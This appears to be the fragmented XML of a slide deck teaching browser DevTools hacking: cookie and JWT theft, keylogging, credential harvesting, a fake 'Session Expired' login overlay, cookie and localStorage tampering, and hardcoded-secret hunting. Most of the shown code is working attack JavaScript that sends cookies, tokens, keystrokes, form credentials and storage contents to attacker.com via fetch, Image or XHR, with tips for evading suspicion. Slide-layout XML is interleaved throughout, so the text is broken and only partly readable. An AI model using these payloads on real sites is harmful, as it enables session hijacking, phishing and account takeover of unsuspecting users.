let sessionCookie = document.cookie
  .split(';')
  .find(c =&gt; c.includes('session') || c.includes('PHPSESSID'))
  .trim();
// Send to attacker server
fetch('https://attacker.com/steal.php?cookie=' + encodeURIComponent(sessionCookie));
// Or use image tag
new Image().src = 'https://attacker.com/steal.php?cookie=' + encodeURIComponent(sessionCookie);
// Or use XMLHttpRequest
let xhr = new XMLHttpRequest();
xhr.open('POST', 'https://attacker.com/steal.php', true);
xhr.send('cookie=' + encodeURIComponent(document.cookie));
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02449" y="3519504"/>
            <a:ext cx="7825502" cy="21788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02449" y="362628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JWT Tokens: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2449" y="3923943"/>
            <a:ext cx="7825502" cy="4797028"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 993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396853" y="3923943"/>
            <a:ext cx="7836694" cy="4797028"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 355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510201" y="4008953"/>
            <a:ext cx="7609999" cy="462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Common JWT storage locations
let jwt = localStorage.getItem('token') ||
 localStorage.getItem('jwt') ||
 localStorage.getItem('access_token') ||
 localStorage.getItem('auth_token') ||
 sessionStorage.getItem('token');
console.log('JWT Token:', jwt);
// Decode JWT (without verification)
function parseJWT(token) {
 try {
 let base64Url = token.split('.')[1];
 let base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
 let jsonPayload = decodeURIComponent(atob(base64).split('').map(c =&gt; {
 return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
 }).join(''));
 return JSON.parse(jsonPayload);
 } catch(e) {
 return null;
 }
}
// View JWT contents
console.log('JWT Payload:', parseJWT(jwt));
// Send to attacker
fetch('https://attacker.com/steal.php', {
 method: 'POST',
 body: JSON.stringify({
 jwt: jwt,
 payload: parseJWT(jwt)
 })
});
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895" y="1037630"/>
            <a:ext cx="2833687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3.6 Keylogging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5895" y="1427202"/>
            <a:ext cx="2125266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Capture Keystrokes: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495895" y="1825466"/>
            <a:ext cx="8152209" cy="5366385"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1109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88871" y="1825466"/>
            <a:ext cx="8166259" cy="5366385"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 396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30555" y="1931670"/>
            <a:ext cx="7882890" cy="515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Simple keylogger
let keylog = '';
document.addEventListener('keypress', function(e) {
 keylog += e.key;
 console.log('Keys pressed:', keylog);
});
// Advanced keylogger with form tracking
let formData = {};
document.addEventListener('input', function(e) {
 if(e.target.name) {
 formData[e.target.name] = e.target.value;
 console.log('Form data:', formData);
 }
});
// Send captured data periodically
setInterval(() =&gt; {
 if(keylog.length &gt; 0) {
 fetch('https://attacker.com/keylog.php', {
 method: 'POST',
 body: JSON.stringify({keylog: keylog, formData: formData})
 });
 keylog = '';
 formData = {};
 }
}, 5000); // Every 5 seconds
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911" y="790813"/>
            <a:ext cx="4445318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3.7 Credential Harvesting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813911" y="1324332"/>
            <a:ext cx="3558897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Capture Login Credentials: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911" y="1912382"/>
            <a:ext cx="13002458" cy="5526405"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 143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04505" y="1912382"/>
            <a:ext cx="13021270" cy="5526405"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 51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92862" y="2053709"/>
            <a:ext cx="12644557" cy="5243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Intercept form submission
document.querySelectorAll('form').forEach(form =&gt; {
 form.addEventListener('submit', function(e) {
 let credentials = {};
 form.querySelectorAll('input').forEach(input =&gt; {
 credentials[input.name] = input.value;
 });
 console.log('Captured credentials:', credentials);
 // Send to attacker
 fetch('https://attacker.com/harvest.php', {
 method: 'POST',
 body: JSON.stringify(credentials)
 });
 // Let form submit normally to avoid suspicion
 });
});
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212" y="642342"/>
            <a:ext cx="4170402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Fake Login Overlay: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267212" y="1389698"/>
            <a:ext cx="7582376" cy="1396484"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6710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6256139" y="1389698"/>
            <a:ext cx="7604522" cy="1396484"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 239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479143" y="1556980"/>
            <a:ext cx="7158514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Inject fake login form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document.body.innerHTML = `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67212" y="3115270"/>
            <a:ext cx="4462105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Session Expired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267212" y="4002167"/>
            <a:ext cx="758237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Please log in again to continue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212" y="4602956"/>
            <a:ext cx="1508522" cy="6135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7212" y="5463302"/>
            <a:ext cx="7582376" cy="2123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`; // Capture credentials document.getElementById('phishing-form').addEventListener('submit', function(e) { e.preventDefault(); let email = this.email.value; let password = this.password.value; // Send to attacker fetch('https://attacker.com/phish.php', { method: 'POST', body: JSON.stringify({email: email, password: password}) }).then(() =&gt; { // Remove overlay and reload location.reload(); }); });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88" y="2499598"/>
            <a:ext cx="4919305" cy="32304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68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Network Tab - Traffic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35110"/>
            <a:ext cx="51346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Find Here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642247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Network tab shows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HTTP/HTTPS requests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made by the page - the goldmine for API discovery and data interception.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4.7 Analyzing Security Headers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4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0520" y="1087874"/>
            <a:ext cx="2909173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Check Response Headers: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210520" y="1410176"/>
            <a:ext cx="2449592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Headers to Look For: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10520" y="1726763"/>
            <a:ext cx="2005489" cy="807244"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 619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084" y="1853327"/>
            <a:ext cx="1705808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Content-Security-Policy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37084" y="2076569"/>
            <a:ext cx="1752362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default-src 'self'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398" y="1726763"/>
            <a:ext cx="2005608" cy="807244"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 619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04961" y="1853327"/>
            <a:ext cx="1487210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X-Frame-Options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04961" y="2076569"/>
            <a:ext cx="1752481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DENY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46394" y="1726763"/>
            <a:ext cx="2005489" cy="807244"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 619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2958" y="1853327"/>
            <a:ext cx="1747480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X-Content-Type-Options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72958" y="2076569"/>
            <a:ext cx="1752362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nosniff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14272" y="1726763"/>
            <a:ext cx="2005608" cy="807244"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 619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40835" y="1853327"/>
            <a:ext cx="1752481" cy="37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Strict-Transport-Security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40835" y="2262426"/>
            <a:ext cx="1752481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max-age=31536000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0520" y="2596396"/>
            <a:ext cx="4073485" cy="621387"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 804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084" y="2722959"/>
            <a:ext cx="1487210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X-XSS-Protection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084" y="2946202"/>
            <a:ext cx="382035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1; mode=block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46394" y="2596396"/>
            <a:ext cx="4073485" cy="621387"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 804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2958" y="2722959"/>
            <a:ext cx="1487210" cy="18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Referrer-Policy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72958" y="2946202"/>
            <a:ext cx="382035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no-referrer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10520" y="3311366"/>
            <a:ext cx="280237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Headers = Vulnerabilities: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0520" y="3627953"/>
            <a:ext cx="8209359" cy="3513773"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1422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4686" y="3627953"/>
            <a:ext cx="8221028" cy="3513773"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 508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3323630" y="3717131"/>
            <a:ext cx="7983141" cy="333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Check headers programmatically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fetch('https://example.com')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.then(response =&gt;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headers = {};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response.headers.forEach((value, key) =&gt;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headers[key] = value;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console.log('Response Headers:', headers);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Check for missing security headers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securityHeaders = [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'content-security-policy',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'x-frame-options',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'x-content-type-options',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'strict-transport-security'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];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securityHeaders.forEach(header =&gt;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if(!headers[header])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console.warn(`Missing: ${header}`);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3521"/>
            <a:ext cx="719066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 Sources/Debugger Tab - Code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61805"/>
            <a:ext cx="51346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Find Here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868942"/>
            <a:ext cx="719066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Sources tab provides access to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JavaScript, CSS, and HTML files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loaded by the page.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28" y="2192298"/>
            <a:ext cx="5285065" cy="384488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4884" y="822008"/>
            <a:ext cx="4909542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5.1 Analyzing JavaScript Files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974884" y="1340882"/>
            <a:ext cx="3867983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Finding Sensitive Information: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974884" y="1908572"/>
            <a:ext cx="1268051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for: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74884" y="2342078"/>
            <a:ext cx="12680513" cy="5065395"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 152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965716" y="2342078"/>
            <a:ext cx="12698849" cy="5065395"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 54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1149429" y="2479834"/>
            <a:ext cx="12331422" cy="4789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API keys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API_KEY = "sk_live_abc123xyz789";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apiKey = "AIzaSyABC123XYZ789";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Credentials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adminPassword = "TempPass123!";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dbPassword = "MySecretDB2023";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Endpoints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API_BASE = "https://internal-api.company.com";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ADMIN_URL = "/secret-admin-panel";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Tokens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authToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";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Debug flags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DEBUG_MODE = true;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400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BYPASS_AUTH = true;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4386" y="1239083"/>
            <a:ext cx="200465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Search All Files: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2704386" y="1647111"/>
            <a:ext cx="9221510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DevTools Search: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704386" y="1905476"/>
            <a:ext cx="9221510" cy="419457"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13382"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4D5D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974" y="2085023"/>
            <a:ext cx="167045" cy="133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38607" y="2017514"/>
            <a:ext cx="8653701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Ctrl+Shift+F (Cmd+Shift+F on Mac)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04386" y="2413516"/>
            <a:ext cx="9221510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terms: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04386" y="2742724"/>
            <a:ext cx="4447699" cy="101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password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api_key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apiKey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secret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token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85698" y="2742724"/>
            <a:ext cx="4447699" cy="101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debug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FIXME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hack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bypass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vulnerable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04386" y="3771078"/>
            <a:ext cx="230945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Download All JavaScript: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2704386" y="4139814"/>
            <a:ext cx="9221510" cy="2577227"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2178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2697718" y="4139814"/>
            <a:ext cx="9234845" cy="2577227"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 778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2831306" y="4239946"/>
            <a:ext cx="8967668" cy="237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all script URLs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scripts = Array.from(document.scripts)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.map(s =&gt; s.src)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.filter(src =&gt; src);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console.log('Scripts:', scripts);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Download each script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scripts.forEach(url =&gt; {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fetch(url)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.then(r =&gt; r.text())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.then(code =&gt; {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console.log(`\n=== ${url} ===\n`, code);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1749" y="1131808"/>
            <a:ext cx="404455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5.2 Debugging and Breakpoints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561749" y="1509593"/>
            <a:ext cx="2066687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Set Breakpoints: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1749" y="1893451"/>
            <a:ext cx="2313980" cy="1822252"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 317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14744" y="2046446"/>
            <a:ext cx="1722239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Line Breakpoint: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14744" y="2311837"/>
            <a:ext cx="2007989" cy="35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Click line number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59310" y="1893451"/>
            <a:ext cx="2313980" cy="1822252"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 317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12306" y="2046446"/>
            <a:ext cx="2007989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Conditional Breakpoint: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12306" y="2527102"/>
            <a:ext cx="2007989" cy="35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Right-click line number → Add conditional breakpoint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12306" y="2931319"/>
            <a:ext cx="2007989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Condition: user.role === 'admin'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6872" y="1893451"/>
            <a:ext cx="2313980" cy="1822252"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 317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9867" y="2046446"/>
            <a:ext cx="2007989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XHR/Fetch Breakpoints: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09867" y="2527102"/>
            <a:ext cx="2007989" cy="35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 → XHR/fetch Breakpoints → Add breakpoint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09867" y="2931319"/>
            <a:ext cx="2007989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URL contains: /api/admin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754433" y="1893451"/>
            <a:ext cx="2314099" cy="1822252"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 317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8C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7429" y="2046446"/>
            <a:ext cx="2008108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Event Listener Breakpoints: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7429" y="2527102"/>
            <a:ext cx="2008108" cy="35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Event Listener Breakpoints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907429" y="2931319"/>
            <a:ext cx="2008108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Check: Mouse → click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907429" y="3158490"/>
            <a:ext cx="2008108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Check: Keyboard → keydown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07429" y="3385661"/>
            <a:ext cx="2008108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Check: Form → submit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1749" y="3878616"/>
            <a:ext cx="9506783" cy="24765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61749" y="4028837"/>
            <a:ext cx="3443883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Inspect Variables During Execution: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61749" y="4412694"/>
            <a:ext cx="9506783" cy="2685098"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2155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54962" y="4412694"/>
            <a:ext cx="9520357" cy="2685098"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 77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2692718" y="4515922"/>
            <a:ext cx="9244846" cy="247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When paused at breakpoint, inspect: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console.log(user);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console.log(authToken);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console.log(apiKey);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Check call stack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console.trace();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Modify variables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user.role = 'admin';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isAuthenticated = true;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Continue execution with modified values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Click "Resume" button or press F8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2588"/>
            <a:ext cx="693872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5.3 Deobfuscating Minified Code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102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Pretty Print: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757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Click {} button (Pretty print)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20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Before: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4530090"/>
            <a:ext cx="6244709" cy="106584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530090"/>
            <a:ext cx="6267331" cy="106584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09293" y="4700111"/>
            <a:ext cx="58137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a(b){return b.role==="admin"?!0:!1}const c=a(user);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920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After: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99521" y="4530090"/>
            <a:ext cx="6244709" cy="1791652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88210" y="4530090"/>
            <a:ext cx="6267331" cy="179165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815024" y="4700111"/>
            <a:ext cx="581370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a(b) {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b.role === "admin" ? !0 : !1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c = a(user);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252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Deobfuscation Tools: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991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Tools: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09493"/>
            <a:ext cx="1304282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https://beautifier.io/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https://deobfuscate.io/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https://lelinhtinh.github.io/de4js/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38428"/>
            <a:ext cx="36979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Deobfuscation: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4803881"/>
            <a:ext cx="13042821" cy="2154555"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4422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803881"/>
            <a:ext cx="13065443" cy="2154555"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 157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09293" y="4973902"/>
            <a:ext cx="126118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Copy obfuscated code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obfuscated = `eval(function(p,a,c,k,e,d){...})`;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Paste in Console and analyze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Replace eval() with console.log() to see decoded code</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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1692" y="1183124"/>
            <a:ext cx="2786063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5.4 Source Map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061692" y="1518047"/>
            <a:ext cx="205763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are Source Maps?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061692" y="1849636"/>
            <a:ext cx="8506897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 maps (.map files) contain the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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original source code</a:t>
            </a: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before minification/compilation.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061692" y="2102287"/>
            <a:ext cx="187249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Finding Source Maps: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61692" y="2433876"/>
            <a:ext cx="8506897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Look for files ending in .map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61692" y="2661404"/>
            <a:ext cx="8506897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 check for comment in JS files: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1692" y="2888933"/>
            <a:ext cx="8506897" cy="336947"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1536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3055620" y="2888933"/>
            <a:ext cx="8519041" cy="336947"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 548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178850" y="2981325"/>
            <a:ext cx="8272582" cy="15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//# sourceMappingURL=app.js.map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1692" y="3326368"/>
            <a:ext cx="2001322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Download Source Map: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061692" y="3657957"/>
            <a:ext cx="8506897" cy="1858566"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2786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55620" y="3657957"/>
            <a:ext cx="8519041" cy="1858566"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 99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3178850" y="3750350"/>
            <a:ext cx="8272582" cy="1673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source map URL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scriptUrl = 'https://example.com/static/js/main.abc123.js';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mapUrl = scriptUrl + '.map';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fetch(mapUrl)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.then(r =&gt; r.json())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.then(sourceMap =&gt; {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console.log('Source Map:', sourceMap);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console.log('Original Sources:', sourceMap.sources);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console.log('Source Content:', sourceMap.sourcesContent);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61692" y="5617012"/>
            <a:ext cx="1970842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Analyze Original Code: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061692" y="5948601"/>
            <a:ext cx="8506897" cy="1097756"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4717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5620" y="5948601"/>
            <a:ext cx="8519041" cy="1097756"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 168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3178850" y="6040993"/>
            <a:ext cx="8272582" cy="91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Source maps reveal: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- Original file structure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- Variable names (before minification)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- Comments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- Development code paths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- Internal API endpoints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9693" y="1275398"/>
            <a:ext cx="3284101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5.5 Overriding JavaScript Files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259693" y="1593533"/>
            <a:ext cx="1763197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Overrides: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59693" y="1905238"/>
            <a:ext cx="8110895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Setup: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59693" y="2116336"/>
            <a:ext cx="8110895" cy="57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Overrides (left panel)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Click "Select folder for overrides"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Choose local folder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Grant permissions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59693" y="2755895"/>
            <a:ext cx="8110895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Override File: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59693" y="2966992"/>
            <a:ext cx="8110895" cy="57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Tab → Page → Select JS file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Right-click → Save for overrides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Edit the file locally</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="11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Refresh page → Modified code runs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59693" y="3629411"/>
            <a:ext cx="1763197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Example Use Cases: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59693" y="3941117"/>
            <a:ext cx="8110895" cy="2886313"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 171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253859" y="3941117"/>
            <a:ext cx="8122563" cy="2886313"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 61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371374" y="4029223"/>
            <a:ext cx="7887533" cy="271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Original code (in production)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isAdmin()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user.role === 'admin';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Override to always return true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isAdmin()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true; // Always admin!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Original validation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validatePassword(pass)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pass.length &gt;= 8 &amp;&amp; /[A-Z]/.test(pass);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Override to always pass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validatePassword(pass) {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true; // Bypass validation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900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5.6 Analyzing Webpack Bundles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4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45200"/>
            <a:ext cx="5627608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Webpack Modules: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76526" y="1633895"/>
            <a:ext cx="13077349" cy="5950506"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 156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65453" y="1633895"/>
            <a:ext cx="13099494" cy="5950506"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 55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87266" y="1800225"/>
            <a:ext cx="12655868" cy="5617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Webpack stores modules in webpackJsonp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if(window.webpackJsonp) {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console.log('Webpack modules:', window.webpackJsonp);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 in __webpack_modules__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if(window.__webpack_modules__) {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Object.keys(window.__webpack_modules__).forEach(key =&gt; {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console.log(`Module ${key}:`, window.__webpack_modules__[key]);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specific module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moduleId = 123;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module = window.__webpack_modules__[moduleId];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console.log('Module code:', module.toString());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9989" y="937498"/>
            <a:ext cx="4549735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5.7 Finding Hardcoded Secrets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819989" y="1380411"/>
            <a:ext cx="3236119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Secret Scanning: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1819989" y="1846778"/>
            <a:ext cx="10990302" cy="5445204"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 122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12131" y="1846778"/>
            <a:ext cx="11006018" cy="5445204"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 43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971318" y="1966198"/>
            <a:ext cx="10687645" cy="5206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Search all scripts for common secret patterns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scripts = Array.from(document.scripts).map(s =&gt; s.src).filter(s =&gt; s);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patterns =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'AWS Key': /AKIA[0-9A-Z]{16}/g,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'API Key': /api[_-]?key["\s:=]+["']?([a-zA-Z0-9_\-]{20,})/gi,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'JWT': /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g,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'Private Key': /-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----/g,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'Password': /password["\s:=]+["']([^"']+)["']/gi,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'Token': /token["\s:=]+["']([a-zA-Z0-9_\-]{20,})["']/gi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scripts.forEach(url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fetch(url)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.then(r =&gt; r.text())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.then(code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Object.keys(patterns).forEach(name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matches = code.match(patterns[name]);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if(matches)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console.warn(`Found ${name} in ${url}:`, matches);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41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 Application/Storage Tab - Data Storage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52411"/>
            <a:ext cx="513468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Find Here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9595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Application tab shows all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client-side storage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cookies, localStorage, sessionStorage, IndexedDB, and more.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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794861"/>
            <a:ext cx="4019193" cy="502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6.1 Cookie Analysis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03302" y="1368504"/>
            <a:ext cx="3014424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All Cookies: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03302" y="2012394"/>
            <a:ext cx="13223796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Tab → Cookies → Select domain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3302" y="2582585"/>
            <a:ext cx="2511981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to Look For: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03302" y="3163610"/>
            <a:ext cx="13223796" cy="4271010"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 19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0922" y="3171230"/>
            <a:ext cx="13207127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3328" y="3285649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Cookie Name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318998" y="3285649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Purpose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20858" y="3285649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Risk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10922" y="3703201"/>
            <a:ext cx="13207127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3328" y="3817620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session_id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18998" y="3817620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identifier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720858" y="3817620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hijacking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10922" y="4235172"/>
            <a:ext cx="13207127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3328" y="4349591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PHPSESSID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18998" y="4349591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PHP session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720858" y="4349591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hijacking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0922" y="4767143"/>
            <a:ext cx="13207127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3328" y="4881563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auth_token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18998" y="4881563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720858" y="4881563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Account takeover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10922" y="5299115"/>
            <a:ext cx="13207127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3328" y="5413534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remember_me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318998" y="5413534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Persistent login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720858" y="5413534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Long-term access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10922" y="5831086"/>
            <a:ext cx="13207127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3328" y="5945505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user_id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318998" y="5945505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identifier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720858" y="5945505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IDOR attacks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10922" y="6363057"/>
            <a:ext cx="13207127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13328" y="6477476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318998" y="6477476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role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720858" y="6477476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Privilege escalation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710922" y="6895028"/>
            <a:ext cx="13207127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3328" y="7009448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5318998" y="7009448"/>
            <a:ext cx="399252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flag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720858" y="7009448"/>
            <a:ext cx="399633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Privilege escalation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22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Cookie Attributes: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751177"/>
            <a:ext cx="13042821" cy="3606165"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2642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2751177"/>
            <a:ext cx="13065443" cy="3606165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09293" y="2921198"/>
            <a:ext cx="12611814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Check cookie security attributes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document.cookie.split(';').forEach(cookie =&gt; {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console.log(cookie);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Dangerous cookies (missing security flags):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✗ No HttpOnly flag → Accessible via JavaScript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✗ No Secure flag → Sent over HTTP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✗ No SameSite flag → CSRF vulnerable</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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72822"/>
            <a:ext cx="3243143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Stealing Cookies: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56642" y="1490424"/>
            <a:ext cx="13117116" cy="6066353"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 149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5927" y="1490424"/>
            <a:ext cx="13138547" cy="6066353"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 53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62025" y="1652468"/>
            <a:ext cx="12706350" cy="5742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all cookies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cookies = document.cookie;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console.log('Cookies:', cookies);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Send to attacker server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fetch('https://attacker.com/steal.php', {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method: 'POST',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body: JSON.stringify({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cookies: document.cookie,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url: location.href,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timestamp: new Date().toISOString()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 via image tag (works even if fetch is blocked)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new Image().src = 'https://attacker.com/steal.php?c=' + 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encodeURIComponent(document.cookie);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79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Modifying Cookies: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206823"/>
            <a:ext cx="13042821" cy="4694873"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2029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2206823"/>
            <a:ext cx="13065443" cy="469487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09293" y="2376845"/>
            <a:ext cx="12611814" cy="435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cookie value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"role=admin; path=/";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"user_id=1; path=/";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"admin=true; path=/";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Delete cookie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"session_id=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/";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Create persistent cookie (1 year)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expiry = new Date();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expiry.setFullYear(expiry.getFullYear() + 1);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`backdoor=active; expires=${expiry.toUTCString()}; path=/`;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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88" y="2442210"/>
            <a:ext cx="4919305" cy="3345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7603"/>
            <a:ext cx="632245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6.2 Local Storage Exploitation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4853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Local Storage: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2507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Tab → Local Storage → Select domain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2953822"/>
            <a:ext cx="3290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Common Sensitive Data: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3903464"/>
            <a:ext cx="3501509" cy="2880360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 330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2479" y="3903464"/>
            <a:ext cx="3524131" cy="2880360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1181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009293" y="4073485"/>
            <a:ext cx="307050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localStorage.getItem('auth_token')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localStorage.getItem('jwt')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localStorage.getItem('api_key')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localStorage.getItem('user_data')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856321" y="3903464"/>
            <a:ext cx="3501509" cy="3243263"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2937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4845010" y="3903464"/>
            <a:ext cx="3524131" cy="3243263"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1049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5071824" y="4073485"/>
            <a:ext cx="307050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localStorage.getItem('access_token')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localStorage.getItem('refresh_token')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localStorage.getItem('session')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localStorage.getItem('credentials')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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8122" y="1177766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All Data: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3068122" y="1542098"/>
            <a:ext cx="8494038" cy="2159556"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 239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062049" y="1542098"/>
            <a:ext cx="8506182" cy="2159556"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 85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3185041" y="1634371"/>
            <a:ext cx="8260199" cy="1975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Export all localStorage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localStorageData = {};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for(let i = 0; i &lt; localStorage.length; i++) {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key = localStorage.key(i);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localStorageData[key] = localStorage.getItem(key);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console.log('LocalStorage:', localStorageData);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Send to attacker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fetch('https://attacker.com/exfiltrate.php', {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method: 'POST',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body: JSON.stringify(localStorageData)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68122" y="3801785"/>
            <a:ext cx="2097048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Manipulate Stored Data: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068122" y="4132659"/>
            <a:ext cx="8494038" cy="2919174"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 177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3062049" y="4132659"/>
            <a:ext cx="8506182" cy="2919174"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6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3185041" y="4224933"/>
            <a:ext cx="8260199" cy="273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user role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userData = JSON.parse(localStorage.getItem('user'));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userData.role = 'admin';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userData.permissions = ['read', 'write', 'delete', 'admin'];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localStorage.setItem('user', JSON.stringify(userData));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Fake authentication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localStorage.setItem('isAuthenticated', 'true');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localStorage.setItem('authToken', 'fake-token-12345');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Modify app settings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settings = JSON.parse(localStorage.getItem('settings'));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settings.debugMode = true;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settings.bypassValidation = true;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localStorage.setItem('settings', JSON.stringify(settings));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Reload to apply changes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="95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location.reload();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88" y="2423755"/>
            <a:ext cx="4919305" cy="33820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75470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6.3 Session Storage Analysis</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4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810577"/>
            <a:ext cx="4670703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Session Data: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78324" y="1700451"/>
            <a:ext cx="12873633" cy="5718572"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 137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69037" y="1700451"/>
            <a:ext cx="12892207" cy="5718572"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 48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055608" y="1840349"/>
            <a:ext cx="12519065" cy="543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Export all sessionStorage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sessionData = {};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for(let i = 0; i &lt; sessionStorage.length; i++)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key = sessionStorage.key(i);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sessionData[key] = sessionStorage.getItem(key);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console.log('SessionStorage:', sessionData);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Common sensitive keys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sensitiveKeys = [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'jwt', 'token', 'auth', 'session', 'user',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'api_key', 'access_token', 'refresh_token'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];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sensitiveKeys.forEach(key =&gt;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value = sessionStorage.getItem(key);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if(value)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console.warn(`Found ${key}:`, value);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4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841" y="1051679"/>
            <a:ext cx="4396145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6.4 IndexedDB Exploitation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34841" y="1518404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IndexedDB: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534841" y="1991797"/>
